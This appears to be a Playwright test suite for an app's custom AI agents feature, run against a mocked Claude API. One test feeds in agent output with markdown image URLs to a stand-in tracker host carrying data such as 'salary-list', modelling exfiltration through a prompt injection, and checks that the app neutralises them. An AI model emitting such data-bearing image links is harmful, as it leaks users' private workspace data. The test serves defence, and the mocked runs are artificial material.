/**
 * Custom agents (#/agents, features/agents) with a mocked Claude API — never api.anthropic.com.
 *
 * Definitions live in the store (Workspace.agents); runs in this device's IndexedDB "one-agents".
 * The browser runner runs in the leader tab: schedules (page.clock), row triggers (coalesced),
 * manual runs; write modes none / stage (review) / apply (+ undo via version history); scope
 * refusals; budget stop; MCP server names; two tabs → one runner.
 */
import type { BrowserContext, Page } from '@playwright/test'
import { test, expect, openApp, pageIdByTitle, wsEval, uiEval, flush, reloadApp, waitForApp, gotoPage } from './fixtures'

type AnyState = Record<string, any> // eslint-disable-line @typescript-eslint/no-explicit-any
type Block = { type: 'text'; text: string } | { type: 'tool_use'; id: string; name: string; input: Record<string, unknown> }

let msgSeq = 0

/** One streamed assistant message in the Messages API SSE shape. */
function sseMessage(blocks: Block[], usage = { input: 1200, output: 80 }): string {
  const ev = (type: string, data: object) => `event: ${type}\ndata: ${JSON.stringify({ type, ...data })}\n\n`
  const stop = blocks.some((b) => b.type === 'tool_use') ? 'tool_use' : 'end_turn'
  let body = ev('message_start', {
    message: { id: `msg_ca_${++msgSeq}`, type: 'message', role: 'assistant', model: 'claude-opus-5-5', content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: usage.input, output_tokens: 1, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 } },
  })
  blocks.forEach((b, index) => {
    if (b.type === 'text') {
      body += ev('content_block_start', { index, content_block: { type: 'text', text: '' } })
      for (const chunk of b.text.match(/.{1,18}/gs) ?? []) body += ev('content_block_delta', { index, delta: { type: 'text_delta', text: chunk } })
    } else {
      body += ev('content_block_start', { index, content_block: { type: 'tool_use', id: b.id, name: b.name, input: {} } })
      for (const chunk of JSON.stringify(b.input).match(/.{1,24}/gs) ?? []) body += ev('content_block_delta', { index, delta: { type: 'input_json_delta', partial_json: chunk } })
    }
    body += ev('content_block_stop', { index })
  })
  body += ev('message_delta', { delta: { stop_reason: stop, stop_sequence: null }, usage: { output_tokens: usage.output } })
  body += ev('message_stop', {})
  return body
}

type Step = (body: AnyState) => string

/** api.anthropic.com → request n gets script[n]; later requests get a short report. Returns the request bodies. */
async function mockClaude(ctx: BrowserContext, script: Step[] = [], fallback = 'Checked everything. Nothing to change.'): Promise<AnyState[]> {
  const bodies: AnyState[] = []
  await ctx.route('https://api.anthropic.com/**', async (route) => {
    const req = route.request()
    const cors = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, GET' }
    if (req.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: cors })
    if (req.method() === 'GET') return route.fulfill({ status: 200, headers: { ...cors, 'content-type': 'application/json' }, body: JSON.stringify({ data: [], has_more: false }) })
    const body = JSON.parse(req.postData() ?? '{}')
    bodies.push(body)
    const step = script[bodies.length - 1] ?? (() => sseMessage([{ type: 'text', text: fallback }]))
    try {
      await route.fulfill({ status: 200, headers: { ...cors, 'content-type': 'text/event-stream' }, body: step(body) })
    } catch {
      /* aborted (budget stop) */
    }
  })
  return bodies
}

const setKey = (page: Page) => wsEval(page, (s) => s.updateSettings({ aiApiKey: 'sk-ant-e2e-test-key' }))

/** Create an agent through the store (defaults: manual, everything, read only, enabled). */
async function addAgent(page: Page, agent: AnyState): Promise<string> {
  const id = await wsEval(
    page,
    (s, a) => {
      const now = Date.now()
      s.upsertAgent({ instructions: 'Look at the workspace and report.', trigger: { type: 'manual' }, scope: { everything: true, pages: [], databases: [] }, write: 'none', output: null, mcpServers: [], runner: 'browser', model: null, effort: null, maxRunUsd: 0.5, enabled: true, createdAt: now, updatedAt: now, ...a })
      return a.id as string
    },
    agent,
  )
  await flush(page)
  return id
}

/** This device's runs of an agent, from IndexedDB (never creates the database). */
async function runsOf(page: Page, agentId: string): Promise<AnyState[]> {
  return page.evaluate(async (id) => {
    const dbs = (await indexedDB.databases?.()) ?? []
    if (!dbs.some((d) => d.name === 'one-agents')) return []
    const db = await new Promise<IDBDatabase>((res, rej) => {
      const r = indexedDB.open('one-agents')
      r.onsuccess = () => res(r.result)
      r.onerror = () => rej(r.error)
    })
    try {
      if (!db.objectStoreNames.contains('runs')) return []
      return await new Promise<AnyState[]>((res, rej) => {
        const q = db.transaction('runs').objectStore('runs').get(`runs:${id}`)
        q.onsuccess = () => res(Array.isArray(q.result) ? q.result : [])
        q.onerror = () => rej(q.error)
      })
    } finally {
      db.close()
    }
  }, agentId)
}

async function waitRuns(page: Page, agentId: string, count: number, done = true, timeout = 30_000): Promise<AnyState[]> {
  await expect
    .poll(async () => (await runsOf(page, agentId)).filter((r) => !done || r.status !== 'running').length, { timeout, message: `runs of ${agentId}` })
    .toBe(count)
  return runsOf(page, agentId)
}

const goAgent = async (page: Page, id: string) => {
  await page.evaluate((id) => (window.location.hash = `#/agents/${id}`), id)
  await expect(page.locator('.agx-dhead')).toBeVisible()
}

const toolResults = (body: AnyState) => (body.messages as AnyState[]).flatMap((m) => (Array.isArray(m.content) ? m.content : [])).filter((c: AnyState) => c.type === 'tool_result')

test.describe('Custom agents', () => {
  test('new agent from a recipe (EN): validation, then saved with the recipe’s trigger', async ({ page }) => {
    await openApp(page, '#/agents')
    await expect(page.getByRole('heading', { name: 'Agents', level: 1 })).toBeVisible()
    // empty state: the recipes
    await page.getByRole('button', { name: /Daily mail triage/ }).click()
    const dialog = page.getByRole('dialog', { name: /New agent/ })
    await expect(dialog).toBeVisible()
    await expect(dialog.getByLabel('Name')).toHaveValue('Daily mail triage')
    await expect(dialog.getByRole('radio', { name: 'New row' })).toHaveAttribute('aria-checked', 'true')
    await expect(dialog.getByRole('radio', { name: 'Proposals for review' })).toHaveAttribute('aria-checked', 'true')

    // the seeded workspace has no Mails database: the trigger needs one
    await dialog.getByLabel('Name').fill('')
    await dialog.getByRole('button', { name: 'Create agent' }).click()
    await expect(dialog.getByText('Give the agent a name.')).toBeVisible()
    await expect(dialog.getByText('Choose the database whose rows start the agent.')).toBeVisible()
    await expect(dialog.getByText('2 fields need attention')).toBeVisible()
    expect(await wsEval(page, (s) => Object.keys(s.agents ?? {}).length)).toBe(0)

    await dialog.getByLabel('Name').fill('Mail triage')
    await dialog.getByRole('button', { name: 'Database' }).click()
    await page.getByRole('menuitem', { name: 'Projects' }).click()
    await expect(dialog.getByText('1 field needs attention')).toHaveCount(0)
    await dialog.getByRole('button', { name: 'Create agent' }).click()
    await expect(dialog).toBeHidden()
    await expect(page.locator('.agx-dhead')).toContainText('Mail triage')
    const projects = await pageIdByTitle(page, 'Projects')
    const agent = await wsEval(page, (s) => Object.values(s.agents ?? {})[0] as AnyState)
    expect(agent).toMatchObject({ name: 'Mail triage', trigger: { type: 'row_created', databaseId: projects }, write: 'stage', runner: 'browser', maxRunUsd: 0.5, enabled: true })
    expect(agent.instructions).toContain('Category')
    await expect(page).toHaveURL(new RegExp(`#/agents/${agent.id}$`))
    await expect(page.locator('.agx-spec--plate')).toContainText('New row in Projects')
    // the list: one instrument card
    await page.getByRole('link', { name: 'Agents' }).first().click()
    await expect(page.locator('.agx-card')).toHaveCount(1)
    await expect(page.locator('.agx-card')).toContainText('Mail triage')
    await expect(page.getByTestId('agx-count')).toContainText('01 · 01 on')
  })

  test('Rezept auf Deutsch: Wochenbericht montags 08:00, nur lesen, Projekte im Bereich', async ({ page }) => {
    await openApp(page)
    await wsEval(page, (s) => s.updateSettings({ language: 'de' }))
    await page.evaluate(() => (window.location.hash = '#/agents'))
    await expect(page.getByRole('heading', { name: 'Agenten', level: 1 })).toBeVisible()
    await page.getByRole('button', { name: /Wochenbericht aus Projekten/ }).click()
    const dialog = page.getByRole('dialog', { name: /Neuer Agent/ })
    await expect(dialog.getByLabel('Name')).toHaveValue('Wochenbericht aus Projekten')
    await expect(dialog.getByRole('radio', { name: 'Zeitplan' })).toHaveAttribute('aria-checked', 'true')
    await expect(dialog.getByRole('radio', { name: 'Nur lesen' })).toHaveAttribute('aria-checked', 'true')
    await expect(dialog.getByLabel('Uhrzeit')).toHaveValue('08:00')
    await dialog.getByRole('button', { name: 'Agent anlegen' }).click()
    await expect(dialog).toBeHidden()
    const projects = await pageIdByTitle(page, 'Projects')
    const agent = await wsEval(page, (s) => Object.values(s.agents ?? {})[0] as AnyState)
    expect(agent).toMatchObject({ name: 'Wochenbericht aus Projekten', write: 'none', trigger: { type: 'schedule', every: 'week', weekday: 1, at: '08:00', tz: 'Europe/Berlin' }, scope: { everything: false, databases: [projects] } })
    await expect(page.locator('.agx-spec--plate')).toContainText('Montags · 08:00')
    await expect(page.locator('.agx-runsec')).toContainText('Noch keine Läufe')
  })

  test('manual run (read tools): run record with report, steps and cost; no writing tools offered', async ({ page, context }) => {
    await openApp(page)
    await setKey(page)
    const projects = await pageIdByTitle(page, 'Projects')
    const bodies = await mockClaude(context, [
      () => sseMessage([{ type: 'tool_use', id: 'tu1', name: 'search_pages', input: { query: 'launch' } }]),
      () => sseMessage([{ type: 'tool_use', id: 'tu2', name: 'query_database', input: { database_id: projects } }]),
      () => sseMessage([{ type: 'text', text: '**Status report:** 6 projects, 2 in progress.' }], { input: 2000, output: 120 }),
    ])
    const id = await addAgent(page, { id: 'ag-read', name: 'Status reader', instructions: 'Summarise the status of all projects.' })
    await goAgent(page, id)
    await page.getByRole('button', { name: 'Run now' }).click()
    const run = page.locator('.agx-run').first()
    await expect(run).toHaveAttribute('data-status', 'ok', { timeout: 20_000 })
    await expect(run.locator('.agx-run__summary')).toContainText('Status report: 6 projects, 2 in progress.')
    await expect(run.locator('.agx-step')).toHaveCount(2)
    await expect(run.locator('.agx-step').first()).toContainText('Search · “launch”')
    await expect(run.locator('.agx-step').nth(1)).toContainText('Query · Projects')
    await expect(run.getByTestId('agx-run-usd')).toHaveText(/\$\d|< \$0\.01/)
    await expect(page.getByText('Status reader: run finished')).toBeVisible()

    const [rec] = await waitRuns(page, id, 1)
    expect(rec).toMatchObject({ agentId: id, runner: 'browser', status: 'ok', trigger: { type: 'manual' } })
    expect(rec.summary).toContain('6 projects')
    expect(rec.usage.usd).toBeGreaterThan(0)
    expect(bodies).toHaveLength(3)
    expect(bodies[0].tools.map((t: AnyState) => t.name)).toEqual(['search_pages', 'read_page', 'list_databases', 'query_database', 'run_query', 'agent_state_get', 'agent_state_set', 'notify_me'])
    expect(bodies[0].system).toContain('You are a custom agent in One')
    expect(bodies[0].system).toContain('You can only read')
    expect(JSON.stringify(bodies[0].messages[0].content)).toContain('Summarise the status of all projects.')
    expect(JSON.stringify(bodies[0].messages[0].content)).toContain('This run was started by a person')
  })

  test('stage mode: proposals wait for review (badge, toast), apply → row changed, "Last edited by" shows the agent', async ({ page, context }) => {
    await openApp(page)
    await setKey(page)
    const projects = await pageIdByTitle(page, 'Projects')
    const row = await wsEval(page, (s, db) => (Object.values(s.pages) as AnyState[]).find((p) => p.databaseId === db && p.title === 'Website relaunch')!.id as string, projects)
    // a "Last edited by" column in the table
    await wsEval(page, (s, db) => s.addProperty(db, { type: 'last_edited_by', name: 'Edited by' }), projects)
    await mockClaude(context, [
      () => sseMessage([{ type: 'tool_use', id: 'tu1', name: 'update_row', input: { id: row, properties: { Priority: 'Low' } } }]),
      () => sseMessage([{ type: 'text', text: 'Proposed: Website relaunch → Low priority.' }]),
    ])
    const id = await addAgent(page, { id: 'ag-stage', name: 'Triage', write: 'stage', scope: { everything: false, pages: [], databases: [projects] } })
    await goAgent(page, id)
    await page.getByRole('button', { name: 'Run now' }).click()
    const run = page.locator('.agx-run').first()
    await expect(run).toHaveAttribute('data-status', 'staged', { timeout: 20_000 })
    await expect(page.getByText('Agent · Triage has 1 proposal')).toBeVisible()
    await expect(page.getByTestId('agents-review')).toContainText('01')
    const change = run.getByRole('listitem', { name: '#1 Edit row' })
    await expect(change.locator('.agent-diff__row', { hasText: 'Priority' })).toContainText('Low')
    // nothing written yet
    const prio = () => wsEval(page, (s, { row, db }) => {
      const prop = s.databases[db].properties.find((p: AnyState) => p.name === 'Priority')
      return prop.options.find((o: AnyState) => o.id === s.pages[row].properties[prop.id])?.name ?? null
    }, { row, db: projects })
    expect(await prio()).toBe('High')

    await run.getByRole('button', { name: 'Apply all' }).click()
    await expect.poll(prio).toBe('Low')
    await expect(change).toHaveAttribute('data-status', 'applied')
    await expect(page.getByTestId('agents-review')).toHaveCount(0)
    expect(await wsEval(page, (s, row) => s.pages[row].updatedBy, row)).toBe(`agent:${id}`)
    const [rec] = await waitRuns(page, id, 1)
    expect(rec.staged[0].status).toBe('applied')

    // the database shows the agent as the last editor
    await page.evaluate((db) => (window.location.hash = `#/p/${db}`), projects)
    // (the first view is a board: the card shows its properties)
    const card = page.locator('#main section.db').getByRole('button', { name: /^Website relaunch/ }).first()
    await expect(card).toContainText('Agent · Triage')

    // the next edit by the person takes "Last edited by" back
    await wsEval(page, (s, row) => s.updatePage(row, { title: 'Website relaunch 2' }), row)
    await expect.poll(() => wsEval(page, (s, row) => s.pages[row].updatedBy ?? null, row)).toBeNull()
  })

  test('apply mode writes directly (stamped as the agent) and is undone through version history', async ({ page, context }) => {
    await openApp(page)
    await setKey(page)
    const wiki = await pageIdByTitle(page, 'Team wiki')
    const before = await wsEval(page, (s, id) => s.pages[id].plain as string, wiki)
    await mockClaude(context, [
      () => sseMessage([{ type: 'tool_use', id: 'tu1', name: 'append_to_page', input: { id: wiki, markdown: '## Agent note\n\nOnboarding checklist reviewed.' } }]),
      () => sseMessage([{ type: 'text', text: 'Added a note to Team wiki.' }]),
    ])
    const id = await addAgent(page, { id: 'ag-apply', name: 'Wiki keeper', write: 'apply', scope: { everything: false, pages: [wiki], databases: [] } })
    await goAgent(page, id)
    await page.getByRole('button', { name: 'Run now' }).click()
    await expect(page.locator('.agx-run').first()).toHaveAttribute('data-status', 'ok', { timeout: 20_000 })
    await expect.poll(() => wsEval(page, (s, id) => s.pages[id].plain as string, wiki)).toContain('Onboarding checklist reviewed.')
    expect(await wsEval(page, (s, id) => s.pages[id].updatedBy, wiki)).toBe(`agent:${id}`)
    // the page's spec plate names the agent as the last editor
    await gotoPage(page, wiki)
    await expect(page.locator('#main .spec .spec__by')).toHaveText('by Agent · Wiki keeper')
    const [rec] = await waitRuns(page, id, 1)
    expect(rec.applied).toBe(1)
    expect(rec.staged[0].status).toBe('applied')
    await flush(page)

    // version history: the state before the agent's change is a version → restore it
    await uiEval(page, (s, pageId) => s.openModal({ type: 'history', pageId }), wiki)
    const dialog = page.getByRole('dialog')
    const version = dialog.locator('.hist__row', { has: page.locator('.hist__tag--ai') }).first()
    await expect(version).toBeVisible()
    await version.click()
    await dialog.getByRole('button', { name: 'Restore this version' }).click()
    await expect(dialog).toBeHidden()
    await expect.poll(() => wsEval(page, (s, id) => s.pages[id].plain as string, wiki)).toBe(before)
  })

  test('what an agent writes loads no web image: report and applied content get links, workspace images stay', async ({ page, context }) => {
    // the classic way text an agent read (a mail, a form answer) smuggles data out: an image address
    const fetched: string[] = []
    await context.route('https://track.example.test/**', (route) => {
      fetched.push(route.request().url())
      return route.fulfill({ status: 200, contentType: 'image/gif', body: '' })
    })
    await openApp(page)
    await setKey(page)
    const wiki = await pageIdByTitle(page, 'Team wiki')
    const report = await wsEval(page, (s) => s.createPage({ title: 'Agent log' }) as string)
    await mockClaude(context, [
      () =>
        sseMessage([
          {
            type: 'tool_use',
            id: 'tu1',
            name: 'append_to_page',
            input: { id: wiki, markdown: '## Digest\n\n![status](https://track.example.test/a.gif?d=salary-list)\n\n![logo](assets/icons/ai.webp)\n\n`![kept as code](https://track.example.test/code.gif)`' },
          },
        ]),
      () => sseMessage([{ type: 'text', text: 'Done. ![](https://track.example.test/r.gif?d=summary) See [[Team wiki]].' }]),
    ])
    const id = await addAgent(page, { id: 'ag-img', name: 'Digest', write: 'apply', scope: { everything: false, pages: [wiki], databases: [] }, output: { pageId: report, mode: 'append' } })
    await goAgent(page, id)
    await page.getByRole('button', { name: 'Run now' }).click()
    await expect(page.locator('.agx-run').first()).toHaveAttribute('data-status', 'ok', { timeout: 20_000 })
    await expect.poll(() => wsEval(page, (s, id) => s.pages[id].plain as string, wiki)).toContain('Digest')

    const images = (id: string) =>
      wsEval(
        page,
        (s, id) => {
          const out: string[] = []
          const walk = (n: AnyState) => (n.type === 'image' && out.push(n.attrs.src), (n.content ?? []).forEach(walk))
          walk(s.pages[id].content)
          return out
        },
        id,
      )
    const links = (id: string) =>
      wsEval(
        page,
        (s, id) => {
          const out: string[] = []
          const walk = (n: AnyState) => {
            for (const m of n.marks ?? []) if (m.type === 'link') out.push(m.attrs.href)
            ;(n.content ?? []).forEach(walk)
          }
          walk(s.pages[id].content)
          return out
        },
        id,
      )
    // the applied content: the web image is a link now; the workspace's own image and code are left as they were
    expect((await images(wiki)).filter((src) => /^(https?:)?\/\//.test(src))).toEqual([])
    expect(await links(wiki)).toContain('https://track.example.test/a.gif?d=salary-list')
    expect(await wsEval(page, (s, id) => s.pages[id].plain as string, wiki)).toContain('![kept as code](https://track.example.test/code.gif)')
    // the report page and the stored run: no image either
    await expect.poll(() => links(report)).toContain('https://track.example.test/r.gif?d=summary')
    expect(await images(report)).toEqual([])
    const [rec] = await waitRuns(page, id, 1)
    expect(rec.summary).not.toContain('![')
    expect(rec.staged[0].markdown).not.toContain('![status]')
    expect(rec.staged[0].markdown).toContain('![logo](assets/icons/ai.webp)')

    // opening both pages fetches nothing from the tracker
    for (const p of [wiki, report]) {
      await page.evaluate((id) => (window.location.hash = `#/p/${id}`), p)
      await expect(page.locator('#main .pv-title')).toBeVisible()
    }
    await page.waitForTimeout(800)
    expect(fetched).toEqual([])
  })

  test('390 px: a run with a long step and a long word stays inside the screen (chips ellipsize, text wraps)', async ({ page, context }) => {
    await page.setViewportSize({ width: 390, height: 844 })
    await openApp(page)
    await setKey(page)
    const projects = await pageIdByTitle(page, 'Projects')
    const row = await wsEval(page, (s, db) => s.createRow(db, { title: `Quarterly planning ${'with a very long row title '.repeat(5)}` }) as string, projects)
    await mockClaude(context, [
      () => sseMessage([{ type: 'tool_use', id: 'tu1', name: 'read_page', input: { id: row } }]),
      () => sseMessage([{ type: 'text', text: `Read it. See https://docs.example.test/${'segment'.repeat(30)}/edit and ${'Unbreakable'.repeat(12)}.` }]),
    ])
    const id = await addAgent(page, { id: 'ag-narrow', name: 'Narrow', scope: { everything: false, pages: [], databases: [projects] } })
    await goAgent(page, id)
    await page.getByRole('button', { name: 'Run now' }).click()
    const run = page.locator('.agx-run').first()
    await expect(run).toHaveAttribute('data-status', 'ok', { timeout: 20_000 })
    await expect(run.locator('.agx-step')).toHaveCount(1)
    const right = (sel: string) => run.locator(sel).first().evaluate((el) => Math.round(el.getBoundingClientRect().right))
    expect(await right('.agx-step')).toBeLessThanOrEqual(390)
    expect(await right('.agx-run__summary')).toBeLessThanOrEqual(390)
    expect(await right('.agx-run__body')).toBeLessThanOrEqual(390)
    // the chip shortens its label instead of growing
    expect(await run.locator('.agx-step__text').evaluate((el) => el.scrollWidth > el.clientWidth)).toBe(true)
  })

  test('scope: a tool call for a page outside the scope is refused', async ({ page, context }) => {
    await openApp(page)
    await setKey(page)
    const wiki = await pageIdByTitle(page, 'Team wiki')
    const notes = await pageIdByTitle(page, 'Weekly sync — notes')
    const bodies = await mockClaude(context, [
      () => sseMessage([{ type: 'tool_use', id: 'tu1', name: 'read_page', input: { id: notes } }]),
      () => sseMessage([{ type: 'tool_use', id: 'tu2', name: 'create_page', input: { title: 'Loose page', markdown: 'x' } }]),
      () => sseMessage([{ type: 'text', text: 'I could not read that page: it is outside my scope.' }]),
    ])
    const id = await addAgent(page, { id: 'ag-scope', name: 'Wiki only', write: 'stage', scope: { everything: false, pages: [wiki], databases: [] } })
    await goAgent(page, id)
    await page.getByRole('button', { name: 'Run now' }).click()
    const run = page.locator('.agx-run').first()
    await expect(run).toHaveAttribute('data-status', 'ok', { timeout: 20_000 })
    await expect(run.locator('.agx-step[data-state="err"]')).toHaveCount(2)
    const [r1] = toolResults(bodies[1])
    expect(r1).toMatchObject({ tool_use_id: 'tu1', is_error: true })
    expect(JSON.stringify(r1.content)).toContain("outside this agent's scope: refused")
    const [r2] = toolResults(bodies[2]).filter((r: AnyState) => r.tool_use_id === 'tu2')
    expect(JSON.stringify(r2.content)).toContain('may not create top-level pages')
    // nothing staged, nothing written
    expect((await runsOf(page, id))[0].staged ?? []).toEqual([])
    // the search only sees pages in scope
    expect(JSON.stringify(bodies[0].messages[0].content)).toContain('only these pages and databases')
  })

  test('schedule: runs at 08:00 (fake clock); a slot missed while One was closed runs once on the next open', async ({ page, context }) => {
    await page.clock.install({ time: new Date('2026-10-05T07:59:00+02:00') })
    await openApp(page)
    await setKey(page)
    const bodies = await mockClaude(context)
    const id = await addAgent(page, { id: 'ag-sched', name: 'Morning check', trigger: { type: 'schedule', every: 'day', at: '08:00', tz: 'Europe/Berlin' } })
    // 07:59 → nothing due
    await page.clock.fastForward('00:20')
    await page.waitForTimeout(500)
    expect(await runsOf(page, id)).toHaveLength(0)
    // 08:00:30 → the 30-second check runs it
    await page.clock.fastForward('01:20')
    const runs = await waitRuns(page, id, 1)
    expect(runs[0]).toMatchObject({ status: 'ok', trigger: { type: 'schedule', detail: 'schedule 08:00' } })
    expect(bodies).toHaveLength(1)
    await page.clock.fastForward('05:00')
    await page.waitForTimeout(500)
    expect(await runsOf(page, id)).toHaveLength(1)

    // One closed until Wednesday 11:00: Tuesday's and Wednesday's slots → ONE run on the next open
    await flush(page)
    await page.goto('about:blank')
    await page.clock.setSystemTime(new Date('2026-10-07T11:00:00+02:00'))
    await page.goto('app/?e2e')
    await waitForApp(page)
    await waitRuns(page, id, 2)
    await page.clock.fastForward('02:00')
    await page.waitForTimeout(800)
    expect(await runsOf(page, id)).toHaveLength(2)
    expect(bodies).toHaveLength(2)
  })

  test('row_created: rows added together start ONE run with all of them as the trigger detail', async ({ page, context }) => {
    await openApp(page)
    await setKey(page)
    const projects = await pageIdByTitle(page, 'Projects')
    const bodies = await mockClaude(context)
    const id = await addAgent(page, { id: 'ag-rows', name: 'Intake', trigger: { type: 'row_created', databaseId: projects }, scope: { everything: false, pages: [], databases: [projects] } })
    await wsEval(page, (s, db) => ['Alpha intake', 'Beta intake', 'Gamma intake'].forEach((title) => s.createRow(db, { title })), projects)
    const runs = await waitRuns(page, id, 1)
    expect(runs[0].trigger.type).toBe('row_created')
    expect(runs[0].trigger.detail).toMatch(/^3 · Alpha intake, Beta intake, Gamma intake/)
    expect(bodies).toHaveLength(1)
    const ctx = JSON.stringify(bodies[0].messages[0].content)
    for (const t of ['Alpha intake', 'Beta intake', 'Gamma intake']) expect(ctx).toContain(t)
    // edits of other rows don't start it; nothing else queued
    await page.waitForTimeout(4000)
    expect(await runsOf(page, id)).toHaveLength(1)
  })

  test('two tabs: only the leader tab runs an agent', async ({ page, context }) => {
    await openApp(page)
    await setKey(page)
    const projects = await pageIdByTitle(page, 'Projects')
    const bodies = await mockClaude(context)
    const id = await addAgent(page, { id: 'ag-two', name: 'Once only', trigger: { type: 'row_created', databaseId: projects } })
    const second = await context.newPage()
    await second.goto('app/?e2e')
    await waitForApp(second)
    await expect.poll(() => wsEval(second, (s) => Object.keys(s.agents ?? {}).length)).toBe(1)
    // the row is made in the second tab; the first one leads
    await wsEval(second, (s, db) => s.createRow(db, { title: 'From tab two' }), projects)
    await flush(second)
    await waitRuns(page, id, 1, true, 40_000)
    await page.waitForTimeout(5000)
    expect(await runsOf(page, id)).toHaveLength(1)
    expect(bodies).toHaveLength(1)
    await second.close()
  })

  test('budget: the run stops when its estimated cost passes the budget', async ({ page, context }) => {
    await openApp(page)
    await setKey(page)
    const bodies = await mockClaude(context, [
      // 200k input tokens on Opus ≈ $0.80 > $0.10
      () => sseMessage([{ type: 'tool_use', id: 'tu1', name: 'list_databases', input: {} }], { input: 200_000, output: 50 }),
      () => sseMessage([{ type: 'text', text: 'never reached' }]),
    ])
    const id = await addAgent(page, { id: 'ag-budget', name: 'Spender', maxRunUsd: 0.1 })
    await goAgent(page, id)
    await page.getByRole('button', { name: 'Run now' }).click()
    const run = page.locator('.agx-run').first()
    await expect(run).toHaveAttribute('data-status', 'budget', { timeout: 20_000 })
    await expect(run).toContainText('Stopped: the budget of $0.10 for this run was used up.')
    await expect(page.getByText('Spender: the run failed')).toBeVisible()
    const [rec] = await waitRuns(page, id, 1)
    expect(rec.status).toBe('budget')
    expect(rec.usage.usd).toBeGreaterThan(0.1)
    expect(bodies).toHaveLength(1)
  })

  test('MCP servers: the agent’s server names go into the request; unknown names are left out with a note', async ({ page, context }) => {
    await openApp(page)
    await setKey(page)
    await wsEval(page, (s) => s.updateSettings({ mcpServers: [{ id: 'm1', name: 'atlas', url: 'https://atlas.example.com/mcp', token: '', enabled: true, prompt: 'Search the knowledge base.' }] }))
    const bodies = await mockClaude(context)
    const id = await addAgent(page, { id: 'ag-mcp', name: 'Knowledge check', mcpServers: ['atlas', 'linear'] })
    await goAgent(page, id)
    await page.getByRole('button', { name: 'Run now' }).click()
    const run = page.locator('.agx-run').first()
    await expect(run).toHaveAttribute('data-status', 'ok', { timeout: 20_000 })
    await expect(run.locator('.agx-step[data-kind="note"]')).toContainText('LINEAR is not set up in this browser')
    expect(bodies[0].mcp_servers).toEqual([{ type: 'url', url: 'https://atlas.example.com/mcp', name: 'atlas' }])
    expect(bodies[0].tools.filter((t: AnyState) => t.type === 'mcp_toolset').map((t: AnyState) => t.mcp_server_name)).toEqual(['atlas'])
    expect(bodies[0].system).toContain('<mcp_server name="atlas">')
  })

  test('runs survive a reload; the sidebar entry opens the list', async ({ page, context }) => {
    await openApp(page)
    await setKey(page)
    await mockClaude(context)
    const id = await addAgent(page, { id: 'ag-keep', name: 'Keeper' })
    await goAgent(page, id)
    await page.getByRole('button', { name: 'Run now' }).click()
    await expect(page.locator('.agx-run').first()).toHaveAttribute('data-status', 'ok', { timeout: 20_000 })
    await waitRuns(page, id, 1)
    await reloadApp(page)
    await page.locator('.sb-nav').getByRole('button', { name: 'Agents' }).click()
    await expect(page).toHaveURL(/#\/agents$/)
    const card = page.locator('.agx-card', { hasText: 'Keeper' })
    await expect(card.getByTestId('agx-state')).toContainText('Ready')
    await expect(card).toContainText('Done')
    await card.getByRole('link', { name: 'Keeper' }).click()
    await expect(page.locator('.agx-run')).toHaveCount(1)
  })
})
